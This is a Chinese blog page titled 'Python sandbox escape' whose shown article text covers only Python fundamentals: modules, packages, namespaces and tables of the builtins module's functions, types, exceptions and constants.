<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/08/12/python 沙箱逃逸/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Python 沙箱逃逸 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">13</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">16</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">50</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Python 沙箱逃逸</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-08-12 00:01:08</span>
        <span class="mobile">2025-08-12 00:01:08</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-08-19 01:12:40</span>
            <span class="mobile">2025-08-19 01:12:40</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/python-web/">python web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/python-web/">python web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>31.5k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>139 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="Python-基础知识"><a href="#Python-基础知识" class="headerlink" title="Python 基础知识"></a>Python 基础知识</h1><h2 id="Python-程序结构"><a href="#Python-程序结构" class="headerlink" title="Python 程序结构"></a>Python 程序结构</h2><h3 id="模块（Module）"><a href="#模块（Module）" class="headerlink" title="模块（Module）"></a>模块（Module）</h3><p>在 Python 中<strong>模块（Module）</strong>就是一个 <code>.py</code> 文件。当你 <code>import</code> 它时，Python 会<strong>先运行一次</strong>这个文件里的代码，然后把运行结果打包成一个<strong>模块对象</strong>。这个模块对象里保存了你在文件里定义的变量、函数和类，这个保存空间就是它的<strong>命名空间</strong>（其实就是一个字典，键是名字，值是对象）。</p>
<p>Python 会把这个模块对象<strong>存到一个全局字典 <code>sys.modules</code> 里</strong>，下次你再导入同名模块，就直接从这个字典里拿现成的，不会再运行一次文件里的代码。具体过程为：</p>
<ol>
<li>先检查全局字典 <strong><code>sys.modules</code></strong> 有没有这个模块对象<ul>
<li>有 → 直接返回，<strong>不会</strong>重复运行文件里的代码</li>
<li>没有 → 执行下一步</li>
</ul>
</li>
<li>创建一个新的<strong>模块对象</strong>（<code>&lt;class &#39;module&#39;&gt;</code>）</li>
<li>把模块对象插入到 <code>sys.modules</code>，键是模块名</li>
<li><strong>执行模块文件里的代码</strong>，把顶层定义的名字（变量、函数、类等）放进模块对象的 <code>__dict__</code>（命名空间）</li>
</ol>
<p>其中 <code>__main__</code> 模块是 Python 运行时的第一个模块，因此在任何 Python 程序中，<code>sys.modules[&quot;__main__&quot;]</code> 都指向当前<strong>入口模块</strong>，也就是运行环境的全局作用域。</p>
<ul>
<li><code>__name__</code>：模块全名；脚本直跑时为 <code>&quot;__main__&quot;</code></li>
<li><code>__file__</code>：源文件路径（内置模块可能没有）</li>
<li><code>__spec__</code>：导入规范对象，描述如何加载（PEP 451）</li>
<li><code>__package__</code>：包名（决定相对导入基准）</li>
<li><code>__loader__</code>：加载器对象</li>
<li><code>__cached__</code>：对应 <code>.pyc</code> 路径</li>
</ul>
<h3 id="包（Package）"><a href="#包（Package）" class="headerlink" title="包（Package）"></a>包（Package）</h3><p><strong>包（Package）</strong>是包含 <code>__init__.py</code> 文件的目录，用于将多个模块按层次结构组织起来。包的作用是<strong>把多个模块按层次结构组织起来</strong>，就像文件夹管理文件一样。</p>
<p>技术上，<strong>包也是 <code>&lt;class &#39;module&#39;&gt;</code> 对象</strong>。包和模块唯一区别是：普通模块来源是一个 <code>.py</code> 文件；包来源是一个 **目录 + <code>__init__.py</code>**。</p>
<p>另外包里面既可以包含<strong>模块</strong>还可以包含<strong>其他的包</strong>。在包对应的目录下：</p>
<ul>
<li><p><code>.py</code> 文件 → 子模块</p>
</li>
<li><p>目录（含 <code>__init__.py</code>）→ 子包</p>
</li>
</ul>
<p>导入时，这些子模块 &#x2F; 子包会被加载为模块对象，并<strong>放进所在包的命名空间里</strong>。例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mypkg.subpkg.mod</span><br></pre></td></tr></table></figure></div>

<p>会让：</p>
<ul>
<li><code>mypkg.__dict__[&#39;subpkg&#39;]</code> 保存 <code>&lt;module &#39;mypkg.subpkg&#39;&gt;</code></li>
<li><code>mypkg.subpkg.__dict__[&#39;mod&#39;]</code> 保存 <code>&lt;module &#39;mypkg.subpkg.mod&#39;&gt;</code></li>
</ul>
<h3 id="命名空间（Namespace）"><a href="#命名空间（Namespace）" class="headerlink" title="命名空间（Namespace）"></a>命名空间（Namespace）</h3><p><strong>命名空间（Namespace）</strong>就是<strong>名字到对象的映射关系</strong>，本质是一个字典，用来存放“某个名字当前指向哪个对象”的信息。</p>
<p>Python 中几乎所有东西（变量、函数、类、模块、包）都是对象，命名空间就是这些名字的存放位置。</p>
<p>常见的几类命名空间：</p>
<ul>
<li><strong>局部命名空间（Local）</strong>：函数或方法内部定义的名字（参数、局部变量等）。</li>
<li><strong>闭包命名空间（Enclosing）</strong>：嵌套函数的外层函数作用域。</li>
<li><strong>全局命名空间（Global）</strong>：一个模块文件顶层定义的名字（模块级变量、函数、类等）。</li>
<li><strong>内置命名空间（Builtins）</strong>：Python 启动时加载的内置名字（<code>len</code>、<code>print</code>、<code>Exception</code> 等）。</li>
</ul>
<p>变量查找遵循 <strong>LEGB</strong>（ <strong>L</strong>ocal → <strong>E</strong>nclosing → <strong>G</strong>lobal → <strong>B</strong>uiltins） 顺序，找不到就抛 <code>NameError</code>，<strong>保证了不同作用域的变量互不冲突</strong>。</p>
<p>在 Python 中，我们可以通过 <code>globals()</code> 和 <code>locals()</code> 函数分别获取<strong>当前模块的全局命名空间</strong>和<strong>当前作用域的局部命名空间</strong>，另外模块的 <code>__dict__</code> 属性表示的是模块的命名空间。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">globals</span>())      <span class="comment"># 当前模块的全局命名空间</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>())       <span class="comment"># 当前作用域的局部命名空间</span></span><br><span class="line"><span class="built_in">print</span>(math.__dict__)  <span class="comment"># math 模块的命名空间</span></span><br></pre></td></tr></table></figure></div>

<h2 id="builtins-模块"><a href="#builtins-模块" class="headerlink" title="builtins 模块"></a>builtins 模块</h2><h3 id="什么是-builtins？"><a href="#什么是-builtins？" class="headerlink" title="什么是 builtins？"></a>什么是 builtins？</h3><p>在 Python 中，有一组功能是<strong>默认就可以用的</strong>，比如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="built_in">len</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="built_in">int</span>(<span class="string">&quot;123&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>这些函数我们<strong>从来没导入过</strong>，就可以直接用。其实它们都来自于一个叫 <code>builtins</code> 的模块。</p>
<p><strong><code>builtins</code> 是 Python 解释器自动导入的模块，包含了 Python 所有的内置函数、类型、异常、常量等。</strong></p>
<p>你可以这样访问它：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(builtins))  <span class="comment"># 列出其中所有内容</span></span><br></pre></td></tr></table></figure></div>

<h3 id="builtins-模块内容"><a href="#builtins-模块内容" class="headerlink" title="builtins 模块内容"></a>builtins 模块内容</h3><h4 id="内置函数（Built-in-Functions）"><a href="#内置函数（Built-in-Functions）" class="headerlink" title="内置函数（Built-in Functions）"></a>内置函数（Built-in Functions）</h4><p>这是我们最熟悉的一类，直接上常用函数举例：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>用途说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>print()</code></td>
<td>打印输出</td>
</tr>
<tr>
<td><code>len()</code></td>
<td>获取长度</td>
</tr>
<tr>
<td><code>type()</code></td>
<td>获取类型</td>
</tr>
<tr>
<td><code>int()</code></td>
<td>转换整数</td>
</tr>
<tr>
<td><code>str()</code></td>
<td>转换字符串</td>
</tr>
<tr>
<td><code>input()</code></td>
<td>获取用户输入</td>
</tr>
<tr>
<td><code>max()</code>&#x2F;<code>min()</code></td>
<td>获取最大&#x2F;最小</td>
</tr>
<tr>
<td><code>sum()</code></td>
<td>求和</td>
</tr>
<tr>
<td><code>sorted()</code></td>
<td>排序</td>
</tr>
<tr>
<td><code>range()</code></td>
<td>生成范围迭代器</td>
</tr>
<tr>
<td><code>abs()</code></td>
<td>绝对值</td>
</tr>
<tr>
<td><code>isinstance()</code></td>
<td>判断对象类型</td>
</tr>
<tr>
<td><code>enumerate()</code></td>
<td>获取下标+元素</td>
</tr>
<tr>
<td><code>zip()</code></td>
<td>打包多个迭代器</td>
</tr>
<tr>
<td><code>eval()</code> &#x2F; <code>exec()</code></td>
<td>动态执行字符串代码（危险函数，慎用）</td>
</tr>
</tbody></table>
<blockquote>
<p>🔍 这些函数本质上等价于 <code>builtins.print()</code>、<code>builtins.len()</code> 等，但我们用的时候可以省略 <code>builtins.</code>，因为它们自动导入到当前作用域中。</p>
</blockquote>
<h4 id="内置类型（Built-in-Types）"><a href="#内置类型（Built-in-Types）" class="headerlink" title="内置类型（Built-in Types）"></a>内置类型（Built-in Types）</h4><p>这些是 Python 的核心数据类型，都是类（<code>type</code>），可实例化。</p>
<table>
<thead>
<tr>
<th>类型名称</th>
<th>示例</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td><code>int</code></td>
<td><code>int(123)</code></td>
<td>整数类型</td>
</tr>
<tr>
<td><code>float</code></td>
<td><code>float(3.14)</code></td>
<td>浮点数类型</td>
</tr>
<tr>
<td><code>str</code></td>
<td><code>&#39;abc&#39;</code></td>
<td>字符串</td>
</tr>
<tr>
<td><code>bool</code></td>
<td><code>True</code> &#x2F; <code>False</code></td>
<td>布尔值</td>
</tr>
<tr>
<td><code>list</code></td>
<td><code>[1,2,3]</code></td>
<td>列表</td>
</tr>
<tr>
<td><code>tuple</code></td>
<td><code>(1,2,3)</code></td>
<td>元组</td>
</tr>
<tr>
<td><code>dict</code></td>
<td><code>&#123;&#39;a&#39;:1&#125;</code></td>
<td>字典</td>
</tr>
<tr>
<td><code>set</code></td>
<td><code>&#123;1,2,3&#125;</code></td>
<td>集合</td>
</tr>
<tr>
<td><code>bytes</code></td>
<td><code>b&#39;abc&#39;</code></td>
<td>字节序列</td>
</tr>
<tr>
<td><code>complex</code></td>
<td><code>1+2j</code></td>
<td>复数</td>
</tr>
<tr>
<td><code>object</code></td>
<td>所有类的父类</td>
<td></td>
</tr>
<tr>
<td><code>type</code></td>
<td>所有类型的元类</td>
<td></td>
</tr>
</tbody></table>
<p>这些你可以当作构造函数使用，也可以用来做类型判断。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">isinstance</span>(<span class="number">123</span>, <span class="built_in">int</span>)  <span class="comment"># True</span></span><br></pre></td></tr></table></figure></div>

<h4 id="内置异常（Built-in-Exceptions）"><a href="#内置异常（Built-in-Exceptions）" class="headerlink" title="内置异常（Built-in Exceptions）"></a>内置异常（Built-in Exceptions）</h4><p>Python 中所有异常类型也都定义在 <code>builtins</code> 中，比如：</p>
<table>
<thead>
<tr>
<th>异常名称</th>
<th>触发场景</th>
</tr>
</thead>
<tbody><tr>
<td><code>Exception</code></td>
<td>所有异常的基类</td>
</tr>
<tr>
<td><code>ValueError</code></td>
<td>值不合法</td>
</tr>
<tr>
<td><code>TypeError</code></td>
<td>类型不合法</td>
</tr>
<tr>
<td><code>NameError</code></td>
<td>变量未定义</td>
</tr>
<tr>
<td><code>IndexError</code></td>
<td>索引越界</td>
</tr>
<tr>
<td><code>KeyError</code></td>
<td>字典键不存在</td>
</tr>
<tr>
<td><code>AttributeError</code></td>
<td>属性不存在</td>
</tr>
<tr>
<td><code>ZeroDivisionError</code></td>
<td>除以零</td>
</tr>
<tr>
<td><code>ImportError</code> &#x2F; <code>ModuleNotFoundError</code></td>
<td>导入失败</td>
</tr>
<tr>
<td><code>SyntaxError</code></td>
<td>语法错误（解释器发现）</td>
</tr>
<tr>
<td><code>IndentationError</code></td>
<td>缩进错误</td>
</tr>
</tbody></table>
<p>使用示例：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="number">1</span> / <span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;除零错误&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="内置常量（Built-in-Constants）"><a href="#内置常量（Built-in-Constants）" class="headerlink" title="内置常量（Built-in Constants）"></a>内置常量（Built-in Constants）</h4><p>这些是所有 Python 代码中都会默认可用的固定值：</p>
<table>
<thead>
<tr>
<th>常量</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>True</code></td>
<td>布尔真</td>
</tr>
<tr>
<td><code>False</code></td>
<td>布尔假</td>
</tr>
<tr>
<td><code>None</code></td>
<td>空值&#x2F;无返回值</td>
</tr>
<tr>
<td><code>Ellipsis</code></td>
<td><code>...</code>，可用作占位符</td>
</tr>
<tr>
<td><code>NotImplemented</code></td>
<td>某些操作未实现时返回的特殊值</td>
</tr>
</tbody></table>
<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><h4 id="动态修改内置函数"><a href="#动态修改内置函数" class="headerlink" title="动态修改内置函数"></a>动态修改内置函数</h4><p>如果你想重写一个内置函数，但仍然希望在某些情况下调用原始的内置函数，可以通过导入并使用 <code>builtins</code> 模块来实现。</p>
